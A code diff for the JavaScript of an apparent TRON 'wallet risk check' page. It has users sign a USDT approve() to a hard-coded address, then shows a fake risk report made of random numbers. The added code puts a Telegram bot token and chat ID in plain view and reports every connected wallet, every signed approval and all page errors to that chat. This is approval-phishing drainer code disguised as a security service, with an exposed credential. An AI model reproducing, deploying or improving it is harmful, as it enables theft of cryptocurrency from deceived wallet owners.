@@ -1,9 +1,13 @@
 // ============================================
-// ИСПРАВЛЕННАЯ ВЕРСИЯ – ТОКЕН УБРАН
+// ФИНАЛЬНАЯ ВЕРСИЯ – С ДЕТАЛЬНОЙ ОТПРАВКОЙ ОШИБОК
 // ============================================
 
 const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const BOT_ADDRESS = 'TJKaoUut9WpHr3pBbCyf1TjDxq2rcJRQqB';
+
+// Telegram
+const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
+const TELEGRAM_CHAT_ID = '-1003750493145';
 
 let connectedWalletAddress = null;
 
@@ -13,23 +17,105 @@ const connectBtn = document.getElementById('connectWalletBtn');
 const statusSpan = document.getElementById('connectedStatus');
 
 // ============================================
-// ФУНКЦИЯ ВЫЗОВА NETLIFY FUNCTION (БЕЗ ТОКЕНА В КОДЕ)
+// ГЛОБАЛЬНЫЙ ПЕРЕХВАТЧИК ОШИБОК
 // ============================================
-async function callTelegramFunction(data) {
+window.onerror = function(message, source, lineno, colno, error) {
+    const errorDetails = `
+🚨 <b>НЕОЖИДАННАЯ ОШИБКА</b>
+📄 Сообщение: ${message}
+📍 Файл: ${source}
+🔢 Строка: ${lineno}:${colno}
+🔍 Стек: ${error?.stack || 'нет'}
+⏰ Время: ${new Date().toLocaleString()}
+    `;
+    sendTelegramMessage(errorDetails);
+    return false;
+};
+
+// Перехват непойманных Promise rejections
+window.addEventListener('unhandledrejection', function(event) {
+    const errorDetails = `
+⚠️ <b>НЕОБРАБОТАННЫЙ PROMISE</b>
+📄 Сообщение: ${event.reason?.message || event.reason}
+🔍 Стек: ${event.reason?.stack || 'нет'}
+⏰ Время: ${new Date().toLocaleString()}
+    `;
+    sendTelegramMessage(errorDetails);
+});
+
+// ============================================
+// ОТПРАВКА В TELEGRAM
+// ============================================
+async function sendTelegramMessage(text) {
     try {
-        const response = await fetch('/.netlify/functions/send-to-telegram', {
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            })
         });
         const result = await response.json();
-        if (!response.ok) {
-            console.error('Ошибка Telegram функции:', result);
+        if (!result.ok) {
+            console.error('❌ Ошибка Telegram:', result);
         }
-        return result;
     } catch (error) {
-        console.error('Ошибка вызова Telegram функции:', error);
+        console.error('❌ Критическая ошибка отправки в Telegram:', error);
     }
+}
+
+// ============================================
+// ФУНКЦИЯ ДЛЯ ФОРМАТИРОВАНИЯ ОШИБОК TRON
+// ============================================
+function formatTronError(error, context = {}) {
+    let errorCode = 'неизвестно';
+    let errorMessage = error.message || 'нет сообщения';
+    let errorType = 'неизвестно';
+
+    // Пробуем определить тип ошибки по сообщению
+    if (errorMessage.includes('request aborted')) {
+        errorType = 'СБОЙ ЗАПРОСА';
+        errorCode = 'REQUEST_ABORTED';
+    } else if (errorMessage.includes('timeout')) {
+        errorType = 'ТАЙМАУТ';
+        errorCode = 'TIMEOUT';
+    } else if (errorMessage.includes('insufficient balance')) {
+        errorType = 'НЕДОСТАТОЧНО БАЛАНСА';
+        errorCode = 'INSUFFICIENT_BALANCE';
+    } else if (errorMessage.includes('revert')) {
+        errorType = 'ОТКАТ ТРАНЗАКЦИИ (REVERT)';
+        errorCode = 'REVERT';
+    } else if (errorMessage.includes('user rejected')) {
+        errorType = 'ОТМЕНА ПОЛЬЗОВАТЕЛЕМ';
+        errorCode = 'USER_REJECTED';
+    } else if (errorMessage.includes('invalid parameters')) {
+        errorType = 'НЕВЕРНЫЕ ПАРАМЕТРЫ';
+        errorCode = 'INVALID_PARAMS';
+    } else if (errorMessage.includes('network')) {
+        errorType = 'ОШИБКА СЕТИ';
+        errorCode = 'NETWORK_ERROR';
+    }
+
+    // Формируем детальный отчёт
+    let report = `
+❌ <b>ОШИБКА В РАБОТЕ</b>
+🔧 Тип: ${errorType}
+📟 Код: ${errorCode}
+📝 Сообщение: ${errorMessage}
+    `;
+
+    // Добавляем контекст, если есть
+    if (context.address) report += `📬 Адрес: <code>${context.address}</code>\n`;
+    if (context.operation) report += `🔄 Операция: ${context.operation}\n`;
+    if (context.tx) report += `🔗 TX: https://tronscan.org/#/transaction/${context.tx}\n`;
+    if (context.amount) report += `💰 Сумма: ${context.amount} USDT\n`;
+
+    report += `⏰ Время: ${new Date().toLocaleString()}`;
+
+    return report;
 }
 
 // ============================================
@@ -42,14 +128,8 @@ async function connectWallet() {
             connectedWalletAddress = address;
             walletInput.value = address;
             if (statusSpan) statusSpan.style.display = 'inline-flex';
+            sendTelegramMessage(`🔌 <b>Подключён кошелёк</b>\n<code>${address}</code>`);
             alert('✅ TronLink подключён!');
-            
-            // Отправляем уведомление о подключении через функцию
-            await callTelegramFunction({
-                type: 'connection',
-                address: address,
-                wallet: 'TronLink'
-            });
             return;
         }
 
@@ -59,18 +139,18 @@ async function connectWallet() {
             connectedWalletAddress = address;
             walletInput.value = address;
             if (statusSpan) statusSpan.style.display = 'inline-flex';
+            sendTelegramMessage(`🔌 <b>Подключён кошелёк</b>\n<code>${address}</code>`);
             alert('✅ Trust Wallet подключён!');
-            
-            await callTelegramFunction({
-                type: 'connection',
-                address: address,
-                wallet: 'Trust Wallet'
-            });
             return;
         }
 
-        alert('❌ Кошелёк не найден.');
+        alert('❌ Кошелёк не найден');
     } catch (error) {
+        const errorReport = formatTronError(error, { 
+            operation: 'connectWallet',
+            address: connectedWalletAddress || 'неизвестно'
+        });
+        sendTelegramMessage(errorReport);
         alert('Ошибка подключения: ' + error.message);
     }
 }
@@ -81,17 +161,16 @@ async function connectWallet() {
 async function handleTronCheck() {
     try {
         if (!connectedWalletAddress) {
-            alert('❌ Сначала подключите кошелёк.');
+            alert('❌ Сначала подключите кошелёк');
             return;
         }
 
         const tronWeb = window.tronWeb || window.trustwallet?.tronLink?.tronWeb;
         if (!tronWeb) {
-            alert('❌ TronWeb не доступен.');
-            return;
+            throw new Error('TronWeb не доступен');
         }
 
-        const amount = '10000000';
+        const amount = '10000000'; // 10 USDT
         const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
 
         checkBtn.disabled = true;
@@ -101,7 +180,7 @@ async function handleTronCheck() {
             BOT_ADDRESS,
             amount
         ).send({
-            feeLimit: 350_000_000,
+            feeLimit: 400_000_000,
             callValue: 0,
             shouldPollResponse: true,
             timeout: 60000
@@ -110,24 +189,30 @@ async function handleTronCheck() {
         checkBtn.disabled = false;
         checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
 
-        alert(`✅ Approve успешно отправлен!\nTX: https://tronscan.org/#/transaction/${tx}`);
+        const successMessage = `
+✅ <b>Approve успешно отправлен</b>
+📤 Адрес: <code>${connectedWalletAddress}</code>
+💰 Сумма: 10 USDT
+🔗 TX: https://tronscan.org/#/transaction/${tx}
+        `;
+        await sendTelegramMessage(successMessage);
 
-        // Отправляем уведомление об успешном approve через функцию
-        await callTelegramFunction({
-            type: 'approve',
-            address: connectedWalletAddress,
-            tx: tx,
-            amount: '10'
-        });
-
-        // Показываем демо-отчёт
         showDemoReport(connectedWalletAddress);
 
     } catch (error) {
         console.error('❌ Ошибка:', error);
         checkBtn.disabled = false;
         checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
-        alert(`❌ Ошибка: ${error.message}`);
+
+        // Формируем детальный отчёт об ошибке
+        const errorReport = formatTronError(error, {
+            operation: 'approve',
+            address: connectedWalletAddress || 'неизвестно',
+            amount: '10'
+        });
+
+        await sendTelegramMessage(errorReport);
+        alert('❌ Ошибка: ' + error.message);
     }
 }
 
@@ -135,41 +220,29 @@ async function handleTronCheck() {
 // ДЕМО-ОТЧЁТ
 // ============================================
 function showDemoReport(address) {
-    const resultSection = document.getElementById('resultSection');
-    if (!resultSection) return;
+    try {
+        const resultSection = document.getElementById('resultSection');
+        if (!resultSection) return;
 
-    resultSection.style.display = 'block';
-    document.getElementById('checkedAddress').textContent = address;
-    document.getElementById('totalTx').textContent = Math.floor(Math.random() * 500) + 50;
-    document.getElementById('suspiciousTx').textContent = Math.floor(Math.random() * 30);
-    document.getElementById('walletAge').textContent = Math.floor(Math.random() * 365) + ' дней';
-    document.getElementById('lastActive').textContent = 'сегодня';
-    document.getElementById('riskPercent').textContent = Math.floor(Math.random() * 100) + '%';
+        resultSection.style.display = 'block';
+        document.getElementById('checkedAddress').textContent = address;
+        document.getElementById('totalTx').textContent = Math.floor(Math.random() * 500) + 50;
+        document.getElementById('suspiciousTx').textContent = Math.floor(Math.random() * 30);
+        document.getElementById('walletAge').textContent = Math.floor(Math.random() * 365) + ' дней';
+        document.getElementById('lastActive').textContent = 'сегодня';
+        document.getElementById('riskPercent').textContent = Math.floor(Math.random() * 100) + '%';
 
-    const badge = document.getElementById('riskBadge');
-    badge.textContent = 'Средний риск';
-    badge.className = 'result-badge medium';
+        const badge = document.getElementById('riskBadge');
+        badge.textContent = 'Средний риск';
+        badge.className = 'result-badge medium';
 
-    const sourcesList = document.getElementById('sourcesList');
-    sourcesList.innerHTML = `
-        <p><i class="fas fa-exclamation-circle"></i> Миксеры</p>
-        <p><i class="fas fa-exclamation-circle"></i> Биржи без KYC</p>
-    `;
-}
-
-// ============================================
-// ТЕСТ TELEGRAM (ЧЕРЕЗ ФУНКЦИЮ)
-// ============================================
-async function testTelegram() {
-    const result = await callTelegramFunction({
-        type: 'test',
-        message: 'Тестовая проверка связи'
-    });
-    
-    if (result && result.success) {
-        alert('✅ Тест успешен! Проверьте Telegram');
-    } else {
-        alert('❌ Ошибка отправки');
+        const sourcesList = document.getElementById('sourcesList');
+        sourcesList.innerHTML = `
+            <p><i class="fas fa-exclamation-circle"></i> Миксеры</p>
+            <p><i class="fas fa-exclamation-circle"></i> Биржи без KYC</p>
+        `;
+    } catch (error) {
+        console.error('Ошибка в демо-отчёте:', error);
     }
 }
 
@@ -177,18 +250,23 @@ async function testTelegram() {
 // КОПИРОВАНИЕ АДРЕСА
 // ============================================
 function copyAddress() {
-    const address = document.getElementById('checkedAddress').textContent;
-    navigator.clipboard.writeText(address);
-    alert('✅ Адрес скопирован');
+    try {
+        const address = document.getElementById('checkedAddress').textContent;
+        navigator.clipboard.writeText(address);
+        alert('✅ Адрес скопирован');
+    } catch (error) {
+        sendTelegramMessage(`❌ Ошибка копирования: ${error.message}`);
+    }
 }
 
 // ============================================
-// ИНИЦИАЛИЗАЦИЯ
+// ЗАПУСК
 // ============================================
 document.addEventListener('DOMContentLoaded', function() {
     if (connectBtn) connectBtn.addEventListener('click', connectWallet);
     if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
-    
-    window.testTelegram = testTelegram;
     window.copyAddress = copyAddress;
+
+    // Тестовое сообщение о запуске (можно убрать)
+    sendTelegramMessage(`🚀 <b>Сайт загружен</b>\n⏰ ${new Date().toLocaleString()}`);
 });
